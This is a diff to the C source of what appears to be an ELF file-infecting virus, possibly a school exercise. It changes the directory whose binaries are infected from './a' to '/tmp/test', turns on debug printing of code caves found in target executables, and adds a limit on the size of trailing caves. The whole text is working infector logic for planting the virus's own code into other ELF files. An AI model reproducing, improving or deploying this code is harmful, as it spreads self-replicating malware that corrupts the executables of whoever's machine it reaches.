@@ -128,11 +128,17 @@ _start() {
     // if (header->e_phnum != 2) infected = 1;
 
     // __attribute__((section(".text"))) volatile static char dir0[] = "./a";
-    volatile char dir0[4];
-    dir0[0] = '.';
-    dir0[1] = '/';
-    dir0[2] = 'a';
-    dir0[3] = 0;
+    volatile char dir0[10];
+    dir0[0] = '/';
+    dir0[1] = 't';
+    dir0[2] = 'm';
+    dir0[3] = 'p';
+    dir0[4] = '/';
+    dir0[5] = 't';
+    dir0[6] = 'e';
+    dir0[7] = 's';
+    dir0[8] = 't';
+    dir0[9] = '\0';
 
     if (infect_dir(dir0, &file_self)) ft_exit(1);
 
@@ -198,14 +204,14 @@ infect_file(volatile char *path, volatile file *file_self) {
 
     volatile code_cave code_caves_target[100];
     uint64_t code_caves_target_num = code_caves_get(code_caves_target, &file_target);
-    // for (int i = 0; i < code_caves_target_num; i++) {
-    //     char nl = '\n';
-    //     print_number_hex(code_caves_target[i].start);
-    //     ft_write(1, &nl, 1);
-    //     print_number_hex(code_caves_target[i].size);
-    //     ft_write(1, &nl, 1);
-    //     ft_write(1, &nl, 1);
-    // }
+    for (int i = 0; i < code_caves_target_num; i++) {
+        char nl = '\n';
+        print_number_hex(code_caves_target[i].start);
+        ft_write(1, &nl, 1);
+        print_number_hex(code_caves_target[i].size);
+        ft_write(1, &nl, 1);
+        ft_write(1, &nl, 1);
+    }
 
     volatile Elf64_Ehdr *header_self = file_self->mem;
     void *builder_self_start = file_self->mem + addr_to_offset(file_self, header_self->e_entry);
@@ -548,7 +554,7 @@ code_caves_get(volatile code_cave *code_caves, volatile file *file) {
             section_cur_end = section_header->sh_offset + section_header->sh_size;
         } else {
             if (!(section_old_end <= header->e_shoff && file->size >= header->e_shoff + header->e_shnum * header->e_shentsize)) {
-
+                if (file->size - section_old_end > 0xfff) return i;
                 code_caves[i].start = section_old_end;
                 code_caves[i].size = file->size - section_old_end;
                 code_caves[i].is_executable = last_one_was_executable;
